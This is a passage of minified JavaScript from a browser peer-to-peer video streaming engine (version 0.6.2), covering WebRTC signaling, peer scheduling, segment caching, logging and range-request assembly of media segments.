${t}`),this.scheduler&&(this.scheduler.deletePeer(e),this._destroyAndDeletePeer(e.remotePeerId,t),this.requestMorePeers(),this.fetcher&&(e.connected||t&&this.fetcher.increFailConns(),t&&this.failedDCSet.add(e.remotePeerId),this._doSignalFusing(this.scheduler.peersNum),this._tryConnectToAllPeers()))})).once(core_events.DC_TIMEOUT,(()=>{this.notFoundDCSet.add(e.remotePeerId)})).once(core_events.DC_CLOSE,(t=>{this.logger.info(`datachannel ${e.channelId} closed fatal ${t}`),this.scheduler&&(this.scheduler.deletePeer(e),this._doSignalFusing(this.scheduler.peersNum)),this._destroyAndDeletePeer(e.remotePeerId,t),t&&this.failedDCSet.add(e.remotePeerId),this.requestMorePeers(),this._tryConnectToAllPeers()})).once(core_events.DC_OPEN,(()=>{e.isInitiator&&this.scheduler.handshakePeer(e)})).once(core_events.DC_METADATA,(t=>{const{scheduler:r}=this;e.isInitiator||r.handshakePeer(e),r.handleMetaData(e,t);const s=this.DCMap.size>=this.minConns+3;this.requestMorePeers(s),this.peersIncrement++,this._doSignalFusing(r.peersNum+1)}))}_doSignalFusing(e){if(this.fuseRate<=0)return;const t=this.signalerWs.connected;t&&e>=this.fuseRate+2?(this.logger.warn("reach fuseRate, report stats close signaler"),this.totalConns-1>0&&this.fetcher.postStats(),this.signalerWs.close()):!t&&e<this.fuseRate&&(this.logger.warn("low conns, reconnect signaler"),this.signalerWs.reconnect())}_initSignalerWs(e,t,r,s){const i=(e,t)=>{let r=`${e}?id=${this.peerId}&p=web&v=0.6.2`;return t&&(r=`${r}&token=${t}`),r};let n,o=i(e,r);if(!this.overloaded&&t&&t!==e){let e=i(t,s);n=new signal_manager(this.logger,this.config,o,e)}else n=new websocket_client(this.logger,this.config,o,270);return n.onopen=()=>{this.connected=!0,this.engine.emit("serverConnected",!0),this._tryConnectToAllPeers()},n.onmessage=(e,t)=>{let r=e.action;const s=e.from_peer_id;switch(r){case"signal":this._handleSignalMsg(s,e,null,t);break;case"reject":this._handSignalRejected(s,e);break;default:this.logger.warn(`Signal websocket unknown action ${r}`)}},n.onclose=()=>{this.connected=!1,this.engine.emit("serverConnected",!1)},n.onerror=e=>{e.message&&this.engine.emit(core_events.EXCEPTION,err_code_default()(e,"SIGNAL_EXPT"))},n}_handSignalRejected(e,t){this.logger.warn(`signaling ${e} rejected, reason ${t.reason}`);const r=this.DCMap.get(e);r&&!r.connected&&(r.destroy(t.fatal),this.DCMap.delete(e)),this.requestMorePeers(),t.fatal&&this.failedDCSet.add(e),this._tryConnectToAllPeers()}_handleSignalMsg(e,t,r,s){if(!this.scheduler)return;const{logger:i}=this;if(t.data){if(this.failedDCSet.has(e))return void this._sendSignalReject(e,`peer ${e} in blocked list`,r,s,!0);this._handleSignal(e,t.data,r,s)}else{const t=this.DCMap.get(e);if(!t)return;if(this.signalerWs.backupConnected&&t&&t.signalMsgs.length>0&&"main"===s&&!t.useBackupSignal){t.useBackupSignal=!0,t.signalName="backup",i.warn(`${e} not found from main, try backup signal`);for(let r of t.signalMsgs)this.signalerWs.sendSignal(e,r,"backup");return}if(t.useBackupSignal)return;this._destroyAndDeletePeer(e),i.info(`signaling ${e} not found`);const{scheduler:n}=this;n.waitForPeer&&(n.waitingPeers--,0===n.waitingPeers&&n.notifyPeersLoaded(0)),this.requestMorePeers(),this._tryConnectToAllPeers(),r||this.notFoundDCSet.add(e)}}_handleSignal(e,t,r,s){const i=t.type,{logger:n}=this;let o=this.DCMap.get(e);if(o){if(o.connected)return void n.info("datachannel had connected, signal ignored");if("offer"===i){if(!(this.peerId>e))return void n.warn(`signal type wrong ${i}, ignored`);this._destroyAndDeletePeer(e,!1),n.warn(`signal type wrong ${i}, convert to non initiator`),o=this._createDatachannel(e,!1,r)}}else{if("answer"===i){const t=`signal type wrong ${i}`;return n.warn(t),this._sendSignalReject(e,t,r,s),void this._destroyAndDeletePeer(e,!1)}n.debug(`receive node ${e} connection request`);const t=this.scheduler.peersNum;if(t>=this.maxConns){const i=this.scheduler.getNonactivePeers();if(!(i.length>0)){const t=`peers reach limit ${this.maxConns}`;return n.warn(t),void this._sendSignalReject(e,t,r,s)}{let e=t-this.maxConns+2;for(i.length<e&&(e=i.length);e>0;){const t=i.shift();t&&(n.warn(`close inactive peer ${t.remotePeerId}`),t.close(!1)),e--}}}o=this._createDatachannel(e,!1,r)}s&&(o.signalName=s),o.receiveSignal(t)}_createDatachannel(e,t,r){let s;if(t&&this.peerPool.size>0)s=this.peerPool.getPeer(),this.logger.info(`get peer from pool, signal size ${s.signalMsgs.length}`),s.assignPeerId(this.peerId,e);else{let i=this.config.trickleICE;r||this.overloaded&&(i=!1),s=new peer(this.engine,this.peerId,e,t,this.config,{stuns:this.stuns,intermediator:r,trickle:i})}return this.DCMap.set(e,s),this._setupDC(s),s}_sendSignalReject(e,t,r,s,i){if(r){const s=this.DCMap.get(r);if(s&&s.sendMsgSignalReject(e,this.peerId,t,i))return}this.signalerWs.sendReject(e,t,i,s)}_requestMorePeers(e){const{logger:t}=this;t.info(`requestMorePeers after delay ${e}`);const r=this.scheduler.peersNum,s=this.peersIncrement;this.peersIncrement=0,r>=this.minConns||(0===r||s<=3&&!this.gotPeersFromTracker&&!this.overloaded?(this.failedDCSet.size>50&&(this.failedDCSet=new Set([...this.failedDCSet].slice(-50))),this.notFoundDCSet.size>20&&(this.notFoundDCSet=new Set([...this.notFoundDCSet].slice(-20))),this.fetcher.btGetPeers([...this.DCMap.keys(),...this.failedDCSet.keys(),...this.notFoundDCSet.keys()]).then((e=>{t.info(`requestMorePeers resp ${JSON.stringify(e,null,2)}`),this.peers=this._filterPeers(e.peers),this._tryConnectToAllPeers()})).catch((e=>{t.error(`requestMorePeers error ${e}`)})),this.gotPeersFromTracker=!0):r<this.maxConnsActive&&(this.scheduler.requestPeers(),this.gotPeersFromTracker=!1))}_destroyAndDeletePeer(e,t=!0){const r=this.DCMap.get(e);return!!r&&(r.destroy(t),this.DCMap.delete(e),!0)}}const tracker_client=TrackerClient;let commonConfig={wsMaxRetries:10,p2pEnabled:!0,wifiOnly:!1,memoryCacheLimit:{pc:629145600,mobile:314572800},dcDownloadTimeout:25,logLevel:"error",tag:"",webRTCConfig:{},token:void 0,appName:void 0,appId:void 0,prefetchNum:5,showSlogan:!1,trickleICE:!0,announceLocation:"cn",trackerZone:void 0,geoIpPreflight:!0,getStats:function(e,t,r){},getPeerId:function(e){},getPeersInfo:function(e){}};const config=commonConfig;class PeerManager{constructor(){this.peerMap=new Map}isEmpty(){return 0===this.peerMap.size}size(){return this.peerMap.size}clear(){this.peerMap.clear()}getPeers(){return[...this.peerMap.values()]}getPeerValues(){return this.peerMap.values()}hasPeer(e){return this.peerMap.has(e)}addPeer(e,t){this.peerMap.set(e,t)}getPeerIds(){return[...this.peerMap.keys()]}removePeer(e){this.peerMap.delete(e)}getPeersOrderByWeight(){const e=this.getAvailablePeers();return e.sort(((e,t)=>0===t.weight?1:0===e.weight?-1:t.weight-e.weight)),e}getPeer(e){return this.peerMap.get(e)}getAvailablePeers(){return this.getPeers().filter((e=>e.isAvailableUrgently))}}const peer_manager=PeerManager,EnumStatus={uninitialized:0,initialized:1,waiting:2,working:3,canceled:4};function createTimeoutGenerator(){return new NextGenerator((function(e){let t;return{execute:function(r=1e3){t=setTimeout(e,r)},cancel:function(){clearTimeout(t)}}}))}class NextGenerator{constructor(e){this.generator=e,this.status=EnumStatus.initialized,this.next=this.next.bind(this)}next(e){if(this.status===EnumStatus.canceled)return console.warn("status is canceled");if(this.status===EnumStatus.waiting)return console.warn("status is waiting");const t=this.execute.bind(this,this.cb);this.nextInfo=this.generator(t),this.status=EnumStatus.waiting,this.nextInfo.execute(e)}execute(e,t){this.status=EnumStatus.working,e.apply(t,[this.next])}cancel(){this.status=EnumStatus.canceled,this.nextInfo&&"function"==typeof this.nextInfo.cancel&&this.nextInfo.cancel()}start(e,t){if("function"!=typeof e)throw new SyntaxError("param cb must be a function");this.cb=e,this.next(t)}continue(e){this.status=EnumStatus.initialized,this.next(e)}}class SeedDetector{constructor(e){this.startPoint=performance.now(),this.reqsSent=0,this.reqsReceived=0,this.peerManager=e}isSeed(){return!(performance.now()-this.startPoint<6e4)&&(this.peerManager.size()>0&&0===this.reqsSent&&this.reqsReceived>0)}reset(){this.reqsSent=this.reqsReceived=0}increReqsSent(){this.reqsSent++}increReqsReceived(){this.reqsReceived++}}const CHECK_CONN_INTERVAL=40,MAX_NO_EXCHANGE_TIME=150,_shareOnly=Symbol("shareOnly");class scheduler_base_SchedulerBase extends(events_default()){constructor(e,t){super(),this.engine=e,this.config=t,this.logger=e.logger,this.bufMgr=null,this.peerManager=new peer_manager,this.seedDetector=new SeedDetector(this.peerManager),this._setupEngine&&this._setupEngine(),this.startCheckConnsTimer(),this.dcDownloadTimeout=t.dcDownloadTimeout,this[_shareOnly]=!1,this.downloadOnly=!1,this.loadedPeerNum=0}get isMobileNet(){return this.engine.isMobileNet}startCheckConnsTimer(){this.checkConnsTimer=setInterval((()=>{this.logger.info("start check conns");const e=this.getStatsForPeer();let t=this.peersNum;const r=getCurrentTs();this.getPeers().forEach((s=>{t>4&&(r-s.dataExchangeTs>MAX_NO_EXCHANGE_TIME||r-s.gotStatsTs>=2*CHECK_CONN_INTERVAL+3)?(this.logger.warn(`close dead or different level peer ${s.remotePeerId} level ${s.currentLevel}`),s.close(!1),t--):s.connected&&s.sendMsgStats(t,e)}))}),1e3*CHECK_CONN_INTERVAL)}getStatsForPeer(){return{}}getNonactivePeers(){const e=getCurrentTs();return this.getPeers().filter((t=>e-t.dataExchangeTs>MAX_NO_EXCHANGE_TIME)).sort(((e,t)=>e.dataExchangeTs-t.dataExchangeTs))}requestPeers(){this.logger.info("request peers from peer");const e={event:core_events.DC_GET_PEERS};this._broadcastToPeers(e,!0)}chokePeerRequest(e){const t={event:core_events.DC_CHOKE};e?e.sendJson(t):this._broadcastToPeers(t)}unchokePeerRequest(e){const t={event:core_events.DC_UNCHOKE};e?e.sendJson(t):this._broadcastToPeers(t)}stopRequestFromPeers(){for(let e of this.peerManager.getPeerValues())e.choked=!0}resumeRequestFromPeers(){for(let e of this.peerManager.getPeerValues())e.choked=!1}setShareOnly(){this[_shareOnly]=!0}deletePeer(e){this.peerManager.hasPeer(e.remotePeerId)&&this.peerManager.removePeer(e.remotePeerId),this._peersStats(this.peerManager.getPeerIds())}getPeers(){return[...this.peerManager.getPeerValues()]}addPeer(e){const{logger:t}=this;this.peerManager.addPeer(e.remotePeerId,e),this[_shareOnly]&&(e.choked=!0);const r=this.peerManager.getPeerIds();this._peersStats(r),t.info(`add peer ${e.remotePeerId}, now has ${r.length} peers`),!e.mobileNet&&!this.waitForPeer&&e.isInitiator&&this.peersNum<=5&&e.peersConnected>1&&e.sendPeersRequest()}get hasPeers(){return this.peersNum>0}get peersNum(){return this.peerManager.size()}get hasIdlePeers(){const{logger:e}=this,t=this.getIdlePeer().length;if(e.info(`peers: ${this.peersNum} idle peers: ${t}`),t<this.peersNum){const t=this.peerManager.getPeers(),r=t.filter((e=>e.downloading));e.warn(`downloading: ${r.length} choked: ${t.filter((e=>e.choked)).length}`);for(let t of r)e.warn(`${t.remotePeerId} loading ${t.segId} packets ${t.bufArr.length} total ${t.pieceMsg.attachments}`)}return t>0}getIdlePeer(){return this.peerManager.getAvailablePeers()}isSeed(){if(!this.config.live)return!1;const e=this.seedDetector.isSeed();return this.seedDetector.reset(),e}set bufferManager(e){this.bufMgr=e,e.on(core_events.BM_LOST,(({sn:e,segId:t,next:r,level:s})=>{this.config.live||this._broadcastToPeers({event:core_events.DC_LOST,sn:e,seg_id:t,level:s||void 0}),this.onBufferManagerLost(e,t,r,s)})).on(core_events.BM_SEG_ADDED,(e=>{this.onBufferManagerSegAdded(e)}))}onBufferManagerSegAdded(e){}destroy(){const{logger:e}=this;this.peersNum>0&&this.peerManager.clear(),this.removeAllListeners(),clearInterval(this.checkConnsTimer),this.checkTimer&&this.checkTimer.cancel(),e.warn("destroy BtScheduler")}notifyPeersLoaded(e){}_setupDC(e){const{logger:t}=this;e.on(core_events.DC_PIECE_ACK,(r=>{r.size&&(this.engine.fetcher.reportUploaded(r.size),t.info(`uploaded ${r.seg_id} size ${r.size} to ${e.remotePeerId}, canceled ${r.canceled||!1}`))})).on(core_events.DC_PIECE_ABORT,(r=>{t.warn(`peer ${e.remotePeerId} download aborted, reason ${r.reason}`),e.downloading&&this._handlePieceAborted&&this._handlePieceAborted(e.remotePeerId),e.downloading=!1})).on(core_events.DC_REQUEST,(()=>{this.seedDetector.increReqsReceived()})).on(core_events.DC_SEND_REQUEST,(()=>{this.seedDetector.increReqsSent()}))}_broadcastToPeers(e,t=!1){for(let r of this.peerManager.getPeerValues())t&&r.mobileNet||r.sendJson(e)}_peersStats(e){this.engine.emit("peers",e);const t=this.engine.config.getPeersInfo;t&&"function"==typeof t&&t(e)}startCheckPeersTimer(e=3e3){this.checkTimer=createTimeoutGenerator(),this.checkTimer.start((e=>{this.checkPeers();const t=1e3*calCheckPeersDelay(this.loadedPeerNum);this.logger.info(`loaded peers ${this.loadedPeerNum} nextDelay ${t}`),this.loadedPeerNum=0,e(t)}),e)}}const scheduler_base=scheduler_base_SchedulerBase;class BtScheduler extends(null){constructor(e,t){super(e,t),this.requestingMap=new RequestingMap,this.bitset=new Set,this.bitCounts=new Map}handshakePeer(e){this._setupDC(e),e.sendMetaData(Array.from(this.bitset),this.sequential,this.peersNum,this.isMobileNet)}handleMetaData(e,t){t.field&&(e.bitset=new Set(t.field),t.field.forEach((e=>{this.bitset.has(e)||this._increBitCounts(e)})),this.addPeer(e),this.downloadOnly&&this.chokePeerRequest(e))}peersHas(e){return this.bitCounts.has(e)}_decreBitCounts(e){if(this.bitCounts.has(e)){let t=this.bitCounts.get(e);1===t?this.bitCounts.delete(e):this.bitCounts.set(e,t-1)}}_increBitCounts(e){if(this.bitCounts.has(e)){let t=this.bitCounts.get(e);this.bitCounts.set(e,t+1)}else this.bitCounts.set(e,1)}reportDCTraffic(e,t,r){if(!this.engine.fetcher)return void this.logger.error("DC report failed");const{fetcher:s}=this.engine;let i=t;this.bitset.has(e)||s.reportDCTraffic(i,r)}cleanRequestingMap(e){const t=this.peerManager.getPeer(e);for(let[r,s]of this.requestingMap.internalMap)s&&s.includes(e)&&(this.logger.info(`delete ${r} in requestingMap`),this.requestingMap.delete(r),this._decreBitCounts(r),t&&t.bitset.delete(r))}getPeerLoadedMore(e){if(!this.requestingMap.has(e))return null;const t=this.requestingMap.getAllPeerIds(e);if(0===t.length)return null;let r=this.peerManager.getPeer(t[0]);if(!r)return null;if(t.length>1)for(let e=1;e<t.length;e++){const s=this.peerManager.getPeer(t[e]);s&&s.bufArr.length>r.bufArr.length&&(r=s)}return r}}const bt_scheduler=null,LIVE_MAX_BUFFER_SIZE=36700160,MIN_SEGMENTS_KEEP=5;class SegmentCache extends(events_default()){constructor(e,t,r=!0){super(),this.isSequential=r,this.logger=t.logger;const s=e.browserInfo.device;this.maxBufSize=s===platform_default().device.PC_WEB||s===platform_default().device.PC_NATIVE?t.memoryCacheLimit.pc:t.memoryCacheLimit.mobile,t.live&&(this.maxBufSize=LIVE_MAX_BUFFER_SIZE),this._segPool=new Map,this._currBufSize=0,this.id2Sn=new Map,this.overflowed=!1}get currBufSize(){return this._currBufSize}hasSegOfId(e){if(this.isSequential){const t=this.id2Sn.get(e);return this._segPool.has(t)}return this._segPool.has(e)}hasSegOfSN(e){return!!this.isSequential&&this._segPool.has(e)}_calSegPoolSize(){let e=0;return this._segPool.forEach((t=>{e+=t.size})),e}putSeg(e){if(this._currBufSize>=1.5*this.maxBufSize&&(this._currBufSize=this._calSegPoolSize(),this._currBufSize>=1.5*this.maxBufSize&&(this.clear(),this.overflowed=!1)),this.isSequential){if(this._segPool.has(e.sn))return;this._addSequentialSeg(e)}else{if(this._segPool.has(e.segId))return;this._addUnsequentialSeg(e)}}_addSequentialSeg(e){const{logger:t}=this,{segId:r,sn:s,size:i}=e;this.id2Sn.set(r,s),this._segPool.set(s,e),this._currBufSize+=parseInt(i);const n=this._segPool.size;if(this.emit(`${core_events.BM_ADDED_SN_}${e.sn}`,e),this.emit(core_events.BM_SEG_ADDED,e),this._currBufSize<this.maxBufSize||n<=MIN_SEGMENTS_KEEP)return;let o=Array.from(this._segPool.keys()).sort(((e,t)=>e-t)),a=0;do{if(a++>10){console.error("too much loops in SegmentCache");break}const e=o.shift();if(void 0===e){t.error("lastSN not found");continue}const r=o[0],s=this._segPool.get(e);if(!s){t.error("lastSeg not found");continue}const i=s.size;this._currBufSize-=parseInt(i),this._segPool.delete(e),this.id2Sn.delete(s.segId),t.info(`pop seg ${e} size ${i} currBufSize ${this._currBufSize}`),this.overflowed||(this.overflowed=!0),this.emit(core_events.BM_LOST,{sn:e,segId:s.segId,next:r,level:s.level})}while(this._currBufSize>=this.maxBufSize&&this._segPool.size>MIN_SEGMENTS_KEEP)}_addUnsequentialSeg(e){const{logger:t}=this,{segId:r,size:s}=e;this._segPool.set(r,e),this._currBufSize+=parseInt(s),this.emit(`${core_events.BM_ADDED_SEG_}${e.segId}`,e),this.emit(core_events.BM_SEG_ADDED,e);let i=0;for(;this._currBufSize>=this.maxBufSize&&this._segPool.size>MIN_SEGMENTS_KEEP;){if(i++>10){console.error("too much loops in SegmentCache");break}const e=[...this._segPool.values()].shift(),r=e.segId,s=e.size;this._currBufSize-=parseInt(s),t.info(`pop seg ${r} size ${s}`),this._segPool.delete(r),this.overflowed||(this.overflowed=!0),this.emit(core_events.BM_LOST,{sn:-1,segId:r,level:e.level})}}getSegById(e){if(this.isSequential){const t=this.id2Sn.get(e);return this._segPool.get(t)}return this._segPool.get(e)}getSegIdBySN(e){const t=this._segPool.get(e);return t?t.segId:null}getSegBySN(e){if(this.isSequential)return this._segPool.get(e);throw new Error("fatal error in SegmentCache")}clear(){this.logger.warn("clear segment cache"),this._segPool.clear(),this.id2Sn.clear(),this._currBufSize=0}destroy(){this.clear(),this.removeAllListeners()}}const segment_cache=SegmentCache,logMap={debug:0,info:1,warn:2,error:3,none:4};class Logger{constructor(e){this.logLevel=e,this.onlineDebug=!1,console.debug=console.log,"debug"!==e&&"info"!==e||(this.logLevel="warn"),!0===e?this.logLevel="warn":!1===e?this.logLevel="none":e in logMap||(this.logLevel="error"),this.resetLogger()}enableDebug(){this.onlineDebug=!0;for(let e in logMap)this[e]=console[e]}resetLogger(){this.onlineDebug=!1;for(let e in logMap)logMap[e]<logMap[this.logLevel]?this[e]=noop:this[e]=console[e]}get isDebugLevel(){return logMap[this.logLevel]<=2||this.onlineDebug}}const utils_logger=Logger,players={DPlayer:"dplayer",CBPlayer:"cbplayer",jwplayer:"jwplayer",videojs:"videojs",Clappr:"clappr",ckplayer:"ckplayer",MediaElementPlayer:"mediaelement",MediaElement:"mediaelement",TcPlayer:"tcplayer",flowplayer:"flowplayer",Chimee:"chimee",ChimeePlayer:"chimee",HlsJsPlayer:"xgplayer",fluidPlayer:"fluidplayer",OpenPlayer:"openplayer",Plyr:"plyr",Playerjs:"playerjs",Aliplayer:"aliplayer",shaka:"shakaplayer"};function player_detector(){let e;for(let t in players)if(window[t]){e=players[t];break}return e}const SAM={_:"nllL",f:"d3NzJ",ss:"==",3:"TNBLy9z",8:"aWduY",u:"mNvbQ",qa:"WwuY2RuY"};class EngineBase extends(events_default()){constructor(e={}){if(super(),this.p2pEnabled=!(!1===e.p2pEnabled||"0"===getQueryParam("_p2p")),e.tag&&e.tag.length>20)throw new Error("Tag is too long");if(e.appName&&e.appName.length>30)throw new Error("appName is too long");if(e.appId&&e.appId.length>30)throw new Error("appId is too long");if(e.token&&e.token.length>20)throw new Error("Token is too long")}initLogger(){const{config:e}=this;e.showSlogan&&"en"===navLang()&&console.log(`%cLet the browsers become your unlimitedly scalable CDN!\n%c${getHomeUrl()}`,"color: dodgerblue; padding:20px 0; font-size: x-large","font-size: medium; padding-bottom:15px");const t=new utils_logger(e.logLevel);return e.logger=this.logger=t,t}getExtraForStats(){const e={},{tracker:t}=this,{scheduler:r}=t;return r&&r.isSeed()&&(e.seed=!0,e.num_want=this._getNumWant(),t.DCMap.size<=t.maxConnsActive+2&&(e.exclusions=[...t.DCMap.keys(),...t.failedDCSet.keys()])),e}getExtraForPeersRequest(){const e={};return e.num_want=this._getNumWant(),e}_getNumWant(){const{tracker:e}=this,t=e.scheduler.peersNum;if(t>0&&e.maxConnsActive-t>0)return e.maxConnsActive-t}makeChannelId(e,t){if(!e||"string"!=typeof e){const e="token is required while using customized channelId!";throw console.error(e),new Error(e)}return(r,s)=>`${e}-${t(r,s)}`}makeSignalId(){let e="";const{config:t}=this,r=decodeURIComponent(window.atob(SAM.f+SAM[3]+SAM[8]+SAM.qa+SAM._+SAM.u+SAM.ss)),{wsSignalerAddr:s}=t;if(s){let i;"object"==typeof s?(s.main||(s.main=r),i=s.main):"string"==typeof s&&(i=s,t.wsSignalerAddr={main:i}),i===r&&(i=void 0),i&&(e=url_toolkit_default().parseURL(i).netLoc.substr(2))}else t.wsSignalerAddr={main:r,default:!0};return e}get commonBrowserInfo(){const e=platform_default().getPlatform(),t=platform_default().getNetType()||"wifi";return this.netType=t,{device:e,netType:t,player:player_detector()||void 0}}get isMobileNet(){return"wifi"!==this.netType&&"ethernet"!==this.netType}setupWindowListeners(e){const t=["iPad","iPhone"].indexOf(navigator.platform)>=0?"pagehide":"beforeunload",r=()=>{this.fetcher&&this.fetcher.postStatsWithBeacon(),this.p2pEnabled&&this.disableP2P(),window.removeEventListener(t,r)};e?window.removeEventListener(t,r):window.addEventListener(t,r)}destroy(){this.disableP2P(!0),this.removeAllListeners(),this.setupWindowListeners(!0)}enableP2P(){return this.p2pEnabled?null:(this.logger&&this.logger.info("enable P2P"),this.config.p2pEnabled=this.p2pEnabled=!0,this.browserInfo?(this._init(this.channel,this.browserInfo),this):null)}get version(){return EngineBase.version}static isSupported(){const e=getBrowserRTC();return!(!e||void 0===e.RTCPeerConnection.prototype.createDataChannel)}static get TrackerZone(){return{CN:"cn",EU:"eu",HK:"hk",USA:"us"}}}EngineBase.version="0.6.2",EngineBase.protocolVersion=peer.VERSION;const engine_base=EngineBase;let defaultP2PConfig={...config,httpLoadTime:3,useHttpRange:!0};defaultP2PConfig.validateSegment=function(e,t){return!0};const dashjs_config=defaultP2PConfig;class requesting_map_RequestingMap extends(events_default()){constructor(e){super(),this.internalMap=new Map,this.eventName=e}has(e){return this.internalMap.has(e)}set(e,t){this.internalMap.set(e,t),this.emit(`${this.eventName}${e}`,t)}get(e){return this.internalMap.get(e)}delete(e){const t=this.internalMap.get(e);return!!t&&(t.destroy(),this.internalMap.delete(e),!0)}clear(){this.internalMap.clear(),this.removeAllListeners()}}const hls_next_events={...core_events,SCH_DCHAVE:"SCH_DCHAVE",SCH_WAIT_PEER:"SCH_WAIT_PEER",STREAM_DETECT:"STREAM_DETECT",STREAM_DISABLE:"STREAM_DISABLE",SW_STREAM_ENABLE:"SW_STREAM_ENABLE",SW_PLAYLIST:"SW_PLAYLIST",SW_GET_PLAYLIST:"SW_GET_PLAYLIST",SW_MEDIA:"SW_MEDIA",SW_PRE_MEDIA:"SW_PRE_MEDIA",SW_GET_MEDIA:"SW_GET_MEDIA",SW_STREAM:"SW_STREAM",LEVEL_LOADED:"LEVEL_LOADED",MANIFEST_PARSED:"MANIFEST_PARSED",FRAG_LOADED:"FRAG_LOADED"};function tryGetMediaElement(e,t){let r;if(e&&("string"==typeof e?r=document.querySelector(e):e instanceof HTMLMediaElement&&(r=e)),!r){const e=[...document.getElementsByTagName("video"),...document.getElementsByTagName("audio")];1===e.length?r=e[0]:(t&&(r=e.find((e=>e.src===t))),r||(r=e.find((e=>e.currentTime>0))))}return r}function calRangeWithForwardReverseOffset(e,t,r,s=0,i=0){const n=DEFAULT_PACKET_SIZE;let o="bytes=",a=s,h=i||r-1;const c=Math.floor(r/n),l=r%n>0?c+1:c;if(e>=0&&(a+=(e+1)*n),o=`${o}${a}-`,t>=0&&t<l){h-=r%n+(l-t-1)*n,o=`${o}${h}`}else 0!==i&&(o=`${o}${h}`);return o}const error_code={ERROR_SYN_INTERNAL:0,ERROR_SYN_RANGE_REQUEST:1,ERROR_SYN_HTTP_TIMEOUT:2,ERROR_SYN_ABORT:3};class Synthesizer extends(events_default()){constructor(e,t,r,s=!1,i){super(),this.coordinator=e,this.logger=t,this.rangeSupported=s,this.rangeStart=0,this.rangeEnd=0,this.httpLoadTime=2e3,this.allowLoadPartial=!1,i&&this.setExtra(i),this.forwardPeer=null,this.reversePeer=null,this.bufArr=[],this.pieceMsg={seg_id:r},this.forwardOffset=-1,this.reverseOffset=1e4,this.timeStart=0,this.timeReceivePiece=0,this.timer=void 0,this.destroyed=!1,this.forwardStreamListeners=[],this.reverseStreamListeners=[],this.rangeRequesting=!1,this.waitingRemain=!1,this.httpLoaded=0,this.p2pLoaded=0,this.deadline=0,this.p2pCanceled=!1}isDownloading(){return this.timeReceivePiece>0}isAlmostDeadline(){return!!this.rangeRequesting||this.deadline>0&&this.deadline-performance.now()<400}hasPeer(e){return!!e&&(e===this.forwardPeer||e===this.reversePeer)}_notifyStreamListeners(e,t,r){const{seg_id:s,attachments:i}=this.pieceMsg,n=e&&0===r||!e&&r===i-1,o=e?this.reverseStreamListeners:this.forwardStreamListeners;for(let e of o){const{handler:r}=e;r(s,!1,t,n)}n&&(o.length=0)}_notifyStreamListenersAbort(){const e=[...this.reverseStreamListeners,...this.forwardStreamListeners];for(let t of e){const{handler:e}=t;e(void 0,void 0,!0,"aborted by synthesizer")}e.length=0}_notifyStreamListenersRemain(){if(this.forwardStreamListeners.length>0){for(let e=this.forwardOffset+1;e<this.bufArr.length;e++)this._notifyStreamListeners(!1,this.bufArr[e],e);this.forwardStreamListeners=[]}if(this.reverseStreamListeners.length>0){for(let e=this.reverseOffset-1;e>=0;e--)this._notifyStreamListeners(!0,this.bufArr[e],e);this.reverseStreamListeners=[]}}addStreamListener(e,t,r){(e?this.reverseStreamListeners:this.forwardStreamListeners).push({handler:r,peerId:t})}removeStreamListener(e){const t=t=>t.filter((t=>t.peerId!==e||(t.handler(void 0,void 0,!0,"aborted by cancel"),!1)));this.forwardStreamListeners=t(this.forwardStreamListeners),this.reverseStreamListeners=t(this.reverseStreamListeners)}setTimeout(e=0){e<=0?setTimeout((()=>{this._handleTimeout(!1,!1)}),0):(this.deadline=performance.now()+e,this._startTimer(e))}setExtra(e={}){e.url&&(this.url=e.url),e.rangeStart&&(this.rangeStart=e.rangeStart),e.rangeEnd&&(this.rangeEnd=e.rangeEnd),e.httpLoadTime&&(this.httpLoadTime=e.httpLoadTime),e.allowLoadPartial&&(this.allowLoadPartial=!0),e.xhrSetup&&(this.xhrSetup=e.xhrSetup),e.headers&&(this.headers=e.headers)}hasForwardPeer(){return!!this.forwardPeer}hasReversePeer(){return!!this.reversePeer}hasPeerId(e){return this.forwardPeer&&this.forwardPeer.remotePeerId===e||this.reversePeer&&this.reversePeer.remotePeerId===e}isEmpty(){return null===this.forwardPeer&&null===this.reversePeer}isFull(){return this.forwardPeer&&this.reversePeer}setForwardPeer(e){this.forwardPeer=e,this.reversePeer&&this._print(),this._setupPeer(e,!1)}setReversePeer(e){this.reversePeer=e,this.forwardPeer&&this._print(),this._setupPeer(e,!0)}deletePeer(e,t=!1){const r=e===this.reversePeer;this._detachPeer(e),r?(this.reversePeer=null,t&&(this.reverseOffset=this.pieceMsg.attachments||1e4)):(this.forwardPeer=null,t&&(this.forwardOffset=-1)),this.isEmpty()&&this._handleTimeout(!1,!1)}terminate(){this._handleTimeout(!1,!1)}_emitPartialOrError(e){if(this.allowLoadPartial&&this.hasPartialBuffer()){const[e,t]=this.getPartialBuffer();this.emit(hls_next_events.SYN_PARTIAL,this.pieceMsg,e,t)}else this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,e)}hasPartialBuffer(){return this.forwardOffset>=0||this.pieceMsg&&this.reverseOffset<this.pieceMsg.attachments}getPartialBuffer(){return[this.forwardOffset>=0?utils_buffer.l.concat(this.bufArr.slice(0,this.forwardOffset+1)):null,this.pieceMsg&&this.reverseOffset<this.pieceMsg.attachments?utils_buffer.l.concat(this.bufArr.slice(this.reverseOffset)):null]}_cancelP2p(){if(this.p2pCanceled)return;this.p2pCanceled=!0;const{seg_id:e}=this.pieceMsg;[this.forwardPeer,this.reversePeer].filter((e=>!!e)).forEach((t=>{t.cancelDownload(void 0,void 0,e)}))}destroy(){this.logger.info("destroy syn"),clearTimeout(this.timer),this._cancelP2p(),this.removeAllListeners(),this.destroyed=!0,this._detachPeer(this.forwardPeer),this.forwardPeer=null,this.forwardOffset=-1,this._detachPeer(this.reversePeer),this.reversePeer=null,this.reverseOffset=1e4,this.bufArr=[],this.forwardStreamListeners=[],this.reverseStreamListeners=[]}_detachPeer(e){if(!e)return;const t=e===this.reversePeer?this.reverseEvents:this.forwardEvents;e.off(hls_next_events.DC_PIECE_DATA,t.onPieceData).off(hls_next_events.DC_PIECE,t.onPiece).off(hls_next_events.DC_PIECE_NOT_FOUND,t.onPieceNotFound).off(hls_next_events.DC_PIECE_ABORT,t.onPieceAbort)}_receivePacket(e,t,r,s=!0){const{seg_id:i,size:n}=this.pieceMsg,o=t-1;if(this.bufArr[o])return this.logger.warn(`syn bufArr ${i} already has 